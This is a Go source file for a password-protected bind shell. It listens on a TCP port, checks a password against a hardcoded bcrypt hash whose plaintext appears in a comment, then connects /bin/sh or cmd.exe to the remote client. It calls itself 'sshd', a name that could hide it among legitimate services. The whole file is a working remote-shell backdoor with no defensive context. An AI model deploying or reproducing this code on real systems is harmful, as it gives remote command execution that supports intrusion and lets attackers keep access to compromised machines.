package main

import (
	"context"
	"flag"
	"log"
	"net"
	"os/exec"
	"runtime"

	"golang.org/x/crypto/bcrypt"

	"github.com/tr3ee/go-link"
)

var (
	network, address string
	hashed           []byte
)

func init() {
	hashed = []byte(`$2a$10$hLclrDw3I9YnK2XB.5zlj.z8dTNlA3vyZK1gdBUZGjjfjvqRaaEh.`) // S1MpL3_5HEL1_S3cRe7
	flag.StringVar(&network, "net", "tcp", "Specifies the network type to listen to.")
	flag.StringVar(&address, "addr", "localhost:6666", "Specify the address and port to listen to.")
	flag.Parse()
}

func main() {
	l, err := net.Listen(network, address)
	if err != nil {
		log.Fatal(err)
	}
	log.Printf("[success] sshd(Simple SHell Daemon) listening on %s:%s", network, address)
	for {
		conn, err := l.Accept()
		if err != nil {
			log.Println(err)
		}
		go handleConn(conn)
	}
}

func handleConn(sess net.Conn) {
	defer sess.Close()
	sess.Write([]byte("password:"))
	password := make([]byte, 32)
	n, err := sess.Read(password)
	if err != nil {
		log.Println(err)
		return
	}
	if n <= 0 {
		return
	}
	password = password[:n]

	if ok := bcrypt.CompareHashAndPassword(hashed, password); ok != nil {
		enc, _ := bcrypt.GenerateFromPassword(password, bcrypt.DefaultCost)
		log.Println("wrong password", string(enc))
		return
	}
	// display banner
	sess.Write([]byte("------------------------------------------------\n"))
	sess.Write([]byte("                   SIMPLE-SHELL                   \n"))
	sess.Write([]byte("------------------------------------------------\n"))
	if err := Shell(sess); err != nil {
		log.Println(err)
	}
}

func Shell(conn net.Conn) error {
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	shdir := `/bin/sh`
	if runtime.GOOS == "windows" {
		shdir = "cmd.exe"
	}
	cmd := exec.CommandContext(ctx, shdir)
	stdin, err := cmd.StdinPipe()
	if err != nil {
		return err
	}
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		return err
	}
	stderr, err := cmd.StderrPipe()
	if err != nil {
		return err
	}
	go func() {
		link.OneWayLink(ctx, conn, stdin, nil)
		cancel()
		conn.Close()
	}()
	go link.OneWayLink(ctx, stdout, conn, nil)
	go link.OneWayLink(ctx, stderr, conn, nil)
	cmd.Run()
	return nil
}
